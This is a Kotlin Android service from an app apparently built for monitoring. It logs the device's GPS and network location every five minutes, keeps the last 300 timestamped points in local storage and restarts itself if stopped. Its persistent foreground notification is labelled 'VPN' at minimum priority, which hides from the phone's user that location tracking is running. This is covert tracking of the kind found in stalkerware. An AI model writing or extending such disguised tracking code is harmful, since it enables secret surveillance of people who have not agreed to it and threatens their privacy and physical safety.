package uz.nazorat.app

import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.IBinder
import org.json.JSONArray
import org.json.JSONObject

/** Joylashuvni davriy yozib boradi (fon xizmati). Ma'lumot telefon ichida. */
class LocationLogService : Service(), LocationListener {

    private var lm: LocationManager? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        startFg()
        startUpdates()
    }

    private fun startFg() {
        val chId = "vpn_svc"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            if (nm.getNotificationChannel(chId) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(chId, "VPN", NotificationManager.IMPORTANCE_MIN))
            }
        }
        val notif: Notification = androidx.core.app.NotificationCompat.Builder(this, chId)
            .setContentTitle("VPN")
            .setSmallIcon(R.drawable.ic_launcher)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
            .build()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(5, notif, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION)
        } else {
            startForeground(5, notif)
        }
    }

    @SuppressLint("MissingPermission")
    private fun startUpdates() {
        lm = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
        try {
            lm?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 5 * 60_000L, 50f, this)
        } catch (e: Exception) {}
        try {
            lm?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 5 * 60_000L, 50f, this)
        } catch (e: Exception) {}
    }

    override fun onLocationChanged(loc: Location) {
        try {
            val arr = JSONArray(Prefs.locHistory(this))
            val o = JSONObject().put("t", System.currentTimeMillis())
                .put("lat", loc.latitude).put("lng", loc.longitude)
            arr.put(o)
            // oxirgi 300 nuqtani saqlaymiz
            val start = maxOf(0, arr.length() - 300)
            val trimmed = JSONArray()
            for (i in start until arr.length()) trimmed.put(arr.get(i))
            Prefs.setLocHistory(this, trimmed.toString())
        } catch (e: Exception) {}
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onDestroy() {
        try { lm?.removeUpdates(this) } catch (e: Exception) {}
        super.onDestroy()
    }

    override fun onProviderDisabled(provider: String) {}
    override fun onProviderEnabled(provider: String) {}
    @Deprecated("Deprecated in Java")
    override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}

    companion object {
        fun start(ctx: Context) {
            Prefs.setLocationOn(ctx, true)
            val i = Intent(ctx, LocationLogService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i) else ctx.startService(i)
        }
        fun stop(ctx: Context) {
            Prefs.setLocationOn(ctx, false)
            ctx.stopService(Intent(ctx, LocationLogService::class.java))
        }
    }
}
